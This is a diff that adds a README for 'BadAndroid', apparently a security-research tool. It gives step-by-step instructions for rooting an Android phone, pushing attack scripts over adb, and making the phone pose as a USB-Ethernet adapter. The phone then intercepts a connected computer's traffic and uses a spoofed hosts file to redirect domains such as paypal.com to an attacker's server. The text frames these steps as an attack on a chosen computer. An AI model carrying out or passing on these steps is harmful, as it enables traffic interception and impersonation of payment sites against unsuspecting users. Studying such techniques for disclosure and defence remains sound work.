@@ -1,0 +1,30 @@
+#############################
+## BadAndroid v0.1         ##
+## Android USB-Ethernet    ##
+## Emulation and DNS MitM  ##
+#############################
+## Jakob Lell              ##
+## <jakob@srlabs.de>       ##
+#############################
+
+Purpose: Spoof a USB-Ethernet adapter from an Android phone to capture network traffic from a connected computer. Then change some DNS answers to redirect traffic.
+
+#1. Root your phone, make sure its connected to the Internet
+
+#2. Install busybox (e.g., using the stericson busybox installer)
+
+#3. Create a hosts file with the domains you want to redirect and with your server’s IP; such as:
+1.2.3.4 paypal.com www.paypal.com
+
+#4. Copy the scripts and hosts file to the phone: 
+adb push bad.sh /data/local/tmp/
+adb push cleanup.sh /data/local/tmp/
+adb push hosts /data/local/tmp/
+
+#5. Install and open a terminal on the phone (e.g. jackpal/Android-Terminal-Emulator) and get a root shell: /system/xbin/su
+
+#6. Run bad.sh: sh /data/local/tmp/bad.sh
+
+#7. Attach the phone to the Windows or Linux computer you want to attack; web traffic should now go through the phone with partial redirection of those domains in the hosts file
+
+#8. When you are finished with the attack, either reboot your phone or run the cleanup.sh script to restore the standard Android USB functionality
